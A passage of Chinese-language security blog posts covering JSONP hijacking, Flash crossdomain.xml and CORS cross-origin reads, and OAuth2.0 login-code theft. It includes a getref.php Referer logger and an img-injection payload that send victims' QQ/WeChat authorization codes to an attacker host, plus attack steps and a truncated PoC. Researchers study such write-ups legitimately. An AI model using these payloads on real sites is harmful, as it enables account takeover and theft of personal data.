class=&quot;p&quot;&gt;));}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://gh0st.cn/user/center?callback=jsonp2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用正常的账号(绑定过手机号)来测试下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x01.png&quot; alt=&quot;json hijacking&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;案例总结&quot;&gt;案例总结&lt;/h3&gt;

&lt;p&gt;其实通过这个例子，我们可以知道HTML标签&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;在一定的情况下是可以跨域读取的。&lt;/p&gt;

&lt;p&gt;对此漏洞的修复有很多：&lt;/p&gt;

&lt;p&gt;1.打乱响应主体内容&lt;/p&gt;

&lt;p&gt;2.Referer等进行限制&lt;/p&gt;

&lt;p&gt;…..等等&lt;/p&gt;

&lt;h2 id=&quot;flash跨域劫持&quot;&gt;Flash跨域劫持&lt;/h2&gt;

&lt;p&gt;Flash跨域比较经典了，在做web目录资产整理的时候有时候会发现这样的文件 &lt;strong&gt;crossdomain.xml&lt;/strong&gt; ，文件内容如果是如下的，那么就存在Flash跨域问题，如下内容的意思是支持所有域：&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;cross-domain-policy&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;allow-access-from&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;domain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/cross-domain-policy&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为什么会如此？具体流程是这样的：&lt;/p&gt;

&lt;p&gt;gh0st.cn 有一个SWF文件，这个文件是想要获取 vulkey.cn 的 userinfo 的返回响应主体，SWF首先会看在 vulkey.cn 的服务器目录下有没有 &lt;strong&gt;crossdomain.xml&lt;/strong&gt; 文件，如果没有就会访问不成功，如果有 &lt;strong&gt;crossdomain.xml&lt;/strong&gt; ，则会看&lt;strong&gt;crossdomain.xml&lt;/strong&gt; 文件的内容里面是否设置了允许 gh0st.cn 域访问，如果设置允许了，那么 gh0st.cn 的SWF文件就可以成功获取到内容。所以要使Flash可以跨域传输数据，其关键就是&lt;strong&gt;crossdomain.xml&lt;/strong&gt; 文件。&lt;/p&gt;

&lt;p&gt;当你发现 &lt;strong&gt;crossdomain.xml&lt;/strong&gt; 文件的内容为我如上所示的内容，那么就是存在Flash跨域劫持的。&lt;/p&gt;

&lt;h3 id=&quot;漏洞案例-1&quot;&gt;漏洞案例&lt;/h3&gt;

&lt;p&gt;在对一个厂商进行测试的时候正好发现了这样的文件：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x02.png&quot; alt=&quot;flash hijacking&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在这里我需要做两件事：&lt;/p&gt;

&lt;p&gt;1.找到一个能获取敏感信息的接口&lt;/p&gt;

&lt;p&gt;2.构建PoC&lt;/p&gt;

&lt;p&gt;在这里敏感的信息接口以个人中心为例子，PoC使用的是 https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x03.png&quot; alt=&quot;flash hijacking&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;案例总结-1&quot;&gt;案例总结&lt;/h3&gt;

&lt;p&gt;很简单的一个东西，但是用处却很大，其利用方法跟CSRF也是一样的，只需要修改下PoC就行。&lt;/p&gt;

&lt;p&gt;修复方案同样也很简单，针对&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;allow-access-from domain=&quot;*&quot; /&amp;gt;&lt;/code&gt;的domain进行调整即可。&lt;/p&gt;

&lt;h2 id=&quot;cors跨域资源读取&quot;&gt;CORS跨域资源读取&lt;/h2&gt;

&lt;h3 id=&quot;漏洞案例-2&quot;&gt;漏洞案例&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x04.png&quot; alt=&quot;CORS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如上图中我在请求的时候加上了请求头 &lt;code class=&quot;highlighter-rouge&quot;&gt;Origin: http://gh0st.cn&lt;/code&gt;，而对应的响应包中出现了&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin: http://gh0st.cn&lt;/code&gt;这个响应头其实就是访问控制允许，在这里是允许http://gh0st.cn的请求的，所以http://gh0st.cn是可以跨域读取此网址的内容的~在这里我介绍下&lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt;：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;Referrer&lt;/code&gt;很相似，就是将当前的请求参数删除，仅剩下&lt;strong&gt;三元组（协议 主机 端口）&lt;/strong&gt;，标准的浏览器，会在每次请求中都带上&lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt;，至少在跨域操作时肯定携带（例如ajax的操作）。&lt;/p&gt;

&lt;p&gt;其实要测试是否可以跨域读取可以参考我如上的方法，当然不仅如此，你可以直接使用通配符(*)替换我的域名，因为这代表着任意域，如果对应的响应包中出现了&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin: *&lt;/code&gt;&lt;strong&gt;等响应头&lt;/strong&gt;，那么恭喜你，这里存在着任意域跨域资源读取的问题。&lt;/p&gt;

&lt;p&gt;怎么利用呢？在这里我使用了github上的开源项目:https://github.com/nccgroup/CrossSiteContentHijacking，readme.md中有具体的说明，这里我就不一一讲解了，那么已经确认问题了，那就需要进一步的验证。&lt;/p&gt;

&lt;p&gt;在这里我找到了一处接口，其响应主体内容是获取用户的真实姓名、身份证、手机号等内容：&lt;/p&gt;

&lt;p&gt;/daren/author/query （要注意的是这个请求在抓取的时候是POST请求方式，但并没有请求正文，经过测试请求正文为任意内容即可）&lt;/p&gt;

&lt;p&gt;响应报文正文内容：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x05.png&quot; alt=&quot;CORS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里CrossSiteContentHijacking项目我搭建在了本地(127.0.0.1) http://127.0.0.1/CrossSiteContentHijacking/ContentHijackingLoader.html&lt;/p&gt;

&lt;p&gt;根据项目所说的操作去进行参数的配置，然后点击 Retrieve Contents 按钮：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x06.png&quot; alt=&quot;CORS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;测试如下，测试结果是可以跨域读取的：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x07.png&quot; alt=&quot;CORS&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;案例总结-2&quot;&gt;案例总结&lt;/h3&gt;

&lt;p&gt;这个问题其实就是对Origin的验证没有控制好，对其进行加强即可。&lt;/p&gt;

&lt;h1 id=&quot;结尾&quot;&gt;结尾&lt;/h1&gt;

&lt;p&gt;结尾想说的东西其实也没什么了，总结了这些东西希望能帮助到各位~&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">前言</summary></entry><entry><title type="html">OAuth2.0认证缺陷-第三方帐号快捷登录授权劫持漏洞</title><link href="http://localhost:4000/archives/2018-02-12/1" rel="alternate" type="text/html" title="OAuth2.0认证缺陷-第三方帐号快捷登录授权劫持漏洞" /><published>2018-02-12T00:00:00+08:00</published><updated>2018-02-12T00:00:00+08:00</updated><id>http://localhost:4000/archives/2018-02-12/OAuth2.0-Vul</id><content type="html" xml:base="http://localhost:4000/archives/2018-02-12/1">&lt;h1 id=&quot;什么是oauth20&quot;&gt;&lt;strong&gt;什么是OAuth2.0？&lt;/strong&gt;&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;OAuth2.0是OAuth协议的下一版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。 OAuth 2.0关注客户端开发者的简易性。要么通过组织在资源拥有者和HTTP服务商之间的被批准的交互动作代表用户，要么允许第三方应用代表用户获得访问的权限。同时为Web应用，桌面应用和手机，和起居室设备提供专门的认证流程。2012年10月，OAuth 2.0协议正式发布为RFC 6749 。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;strong&gt;RFC 6749 : https://tools.ietf.org/html/rfc6749&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;qq-oauth20-流程分析攻击&quot;&gt;&lt;strong&gt;QQ OAuth2.0 流程分析&amp;amp;攻击&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;国内的很多厂商使用了OAuth2.0的认证方式，这里以QQ为例。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;QQ互联 : https://connect.qq.com/intro/login&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;相信大家在很多网站上都见过如下的登陆界面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x00.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看见除了厂商本身网站的账号以外还有QQ跟微信这两个快捷登陆，首先以QQ的快捷登陆为例子：&lt;/p&gt;

&lt;p&gt;点击QQ图标进入登陆的链接 -&amp;gt; &lt;strong&gt;https://graph.qq.com/oauth2.0/show?which=Login&amp;amp;display=pc&amp;amp;response_type=code&amp;amp;client_id=100273020&amp;amp;redirect_uri=http://a.com/?view=null&amp;amp;uuid=65392bc3fc724fca8dcba23558f67ec8&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x01.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里因为我的QQ是在电脑上已经登陆了，所以我可以直接进行登陆，这时候进行抓包截取整个流程，&lt;/p&gt;

&lt;h1 id=&quot;关键流程分析&quot;&gt;&lt;strong&gt;关键流程分析&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Request 1：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/oauth2.0/authorize&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;graph.qq.com&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;1 Response：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;302&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Moved Temporarily&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;tws&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Fri, 09 Feb 2018 11:50:42 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;keep-alive&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Keep-Alive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;timeout=50&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http:/a.com/?uuid=65392bc3fc724fca8dcba23558f67ec8&amp;amp;code=120ED71CAECB11BAD538820E12B54664&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Request 2：&lt;/strong&gt;(这个请求表示根据参数&lt;strong&gt;code&lt;/strong&gt;的值进行个人用户凭证生成)&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/?uuid=65392bc3fc724fca8dcba23558f67ec8&amp;amp;code=120ED71CAECB11BAD538820E12B54664&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;a.com&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;2 Response：&lt;/strong&gt;（setcookie返回用户凭证）&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;302&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Moved Temporarily&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;用户凭证&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://www.a.com/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时候我们就可以注意到问题了，请求1产生了一个链接，其就是QQ登陆的地址中的参数&lt;strong&gt;redirect_uri&lt;/strong&gt;附带上&lt;strong&gt;参数code的值&lt;/strong&gt;，而这个链接是生成用户凭证的，所以链接中的&lt;strong&gt;参数code&lt;/strong&gt;也是至关重要的，看到这里我的攻击思路已经产生了：&lt;/p&gt;

&lt;p&gt;假设QQ登陆的地址中的参数&lt;strong&gt;redirect_uri&lt;/strong&gt;的值可以为我的网站，那么只要用户A点击我就可以根据网站日志访问记录获取参数&lt;strong&gt;code&lt;/strong&gt;的值再根据请求2获取用户A在 http://a.com 的账号权限。&lt;/p&gt;

&lt;p&gt;理想很好，现实残酷：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x02.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里QQ做了限制，我不需要去分析QQ关联的全部流程就能知道这里的参数client_id，其实就是 http://a.com 的QQ互联的服务id， http://graph.qq.com 根据client_id获取 http://a.com 的设置允许的参数&lt;strong&gt;redirect_uri&lt;/strong&gt;的值再跟你输入的参数&lt;strong&gt;redirect_uri&lt;/strong&gt;的值进行比较。&lt;/p&gt;

&lt;p&gt;这时候我只需要对参数&lt;strong&gt;redirect_uri&lt;/strong&gt;进行Fuzz就能知道哪些范围是允许的：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x03.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;http://a.com 的二级子域名可以为参数&lt;strong&gt;redirect_uri&lt;/strong&gt;的值，目前我需要解决的就是如何根据 http://a.com 的二级子域名获取到code的值：&lt;/p&gt;

&lt;h1 id=&quot;1我有一个html注入漏洞&quot;&gt;&lt;strong&gt;1.我有一个HTML注入漏洞&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;漏洞地址：&lt;code class=&quot;highlighter-rouge&quot;&gt;http://1.a.com/?xss=%3Cimg%20src=&quot;http://www.evilchen.cn/getref.php&quot;%3E&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;getref.php的内容为如下PHP代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ref.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'HTTP_REFERER'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将漏洞地址作为参数&lt;strong&gt;redirect_uri&lt;/strong&gt;的值，然后诱导用户A点击登陆，这时候跳转的链接就变成了：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://1.a.com/?xss=%3Cimg%20src=”http://www.evilchen.cn/getref.php”%3E&amp;amp;code=120ED71CAECB11BAD538820E12B54664&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;跳转之后这个链接会做为HTTP Referer的值再请求[http://www.evilchen.cn/getref.php]，那么我的服务器就会接收到code的值，再根据Request 2的值填入，我就可以获取用户A在a.com的账号权限了&lt;/p&gt;

&lt;h1 id=&quot;2我能在其他地方引用外部资源&quot;&gt;&lt;strong&gt;2.我能在其他地方引用外部资源&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x04.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;很多厂商都会有社区、论坛等功能，大部分会使用Discuz程序来做，而Discuz确实可以引用外部资源~&lt;/p&gt;

&lt;p&gt;这里我使用的图片地址还是 http://www.evilchen.cn/getref.php 然后进行帖子回复。&lt;/p&gt;

&lt;p&gt;帖子地址为 http://bbs.a.com/thread-123-1-1.html 将帖子地址作为参数&lt;strong&gt;redirect_uri&lt;/strong&gt;的值，然后诱导用户A点击登陆，这时候跳转的链接就变成了：&lt;/p&gt;

&lt;p&gt;http://bbs.a.com/thread-123-1-1.html?code=120ED71CAECB11BAD538820E12B54664&lt;/p&gt;

&lt;p&gt;跳转之后这个链接会做为HTTP Referer的值再请求 http://www.evilchen.cn/getref.php 那么我的服务器就会接收到code的值，再根据Request 2的值填入，我就可以获取用户A在a.com的账号权限了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x05.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;攻击流程&quot;&gt;&lt;strong&gt;攻击流程&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1.我点击 http://a.com 的QQ登录，获取QQ快捷登录链接，替换redirect_uri的值为如上两个问题的地址然后发送给受害者2.受害者点击QQ头像登录，会跳转到redirect_uri的值(链接)，并且携带上code的值&lt;/p&gt;

&lt;p&gt;3.受害者浏览器以跳转后的链接作为referer头请求外链图片(php)&lt;/p&gt;

&lt;p&gt;4.攻击者获取referer的值，构建B地址，并且进入链接(注意 攻击者要在未登录情况下)&lt;/p&gt;

&lt;h1 id=&quot;微信快捷登陆流程&quot;&gt;&lt;strong&gt;微信快捷登陆流程&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;开发平台：https://open.weixin.qq.com/&lt;/p&gt;

&lt;p&gt;http://a.com的地址如下：&lt;/p&gt;

&lt;p&gt;https://open.weixin.qq.com/connect/qrconnect?appid=&amp;amp;redirect_uri=http://a.com/wx?callback=null&lt;/p&gt;

&lt;p&gt;微信扫描后会跳转到：&lt;/p&gt;

&lt;p&gt;http://a.com/weixin?callback=null&amp;amp;code=021n2XAB00C4mg2FvKyB0W7QAB0n2XAF&lt;/p&gt;

&lt;p&gt;而只要利用QQ快捷登陆的方法我们一样可以获取到code的值&lt;/p&gt;

&lt;h1 id=&quot;攻击流程-1&quot;&gt;&lt;strong&gt;攻击流程&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1.我点击http://a.com的QQ登录，获取微信快捷登录链接，替换redirect_uri的值为如上两个问题的地址然后发送给受害者
2.受害者点开微信扫描，会跳转到redirect_uri的值(链接)，并且携带上code的值&lt;/p&gt;

&lt;p&gt;3.受害者浏览器以跳转后的链接作为referer头请求外链图片(php)&lt;/p&gt;

&lt;p&gt;4.攻击者获取referer的值，构建B地址，并且进入链接(注意 攻击者要在未登录情况下)&lt;/p&gt;

&lt;h1 id=&quot;风险检测&quot;&gt;&lt;strong&gt;风险检测&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;我简单的写了个poc，仅仅做风险检测，具体危害可以自行检查~~（&lt;strong&gt;PS：这里小编对PoC进行了简单的优化，支持微信跟QQ的快捷登陆风险检测&lt;/strong&gt;）&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Name: QQ and WeChat OAuth2.0 PoC&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Auther: MSTLab(EvilChen)&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unquote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;tempUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;tempDomain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tempUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netloc&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;domainA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tempDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;domainB&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tempDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domainA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mstlab&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
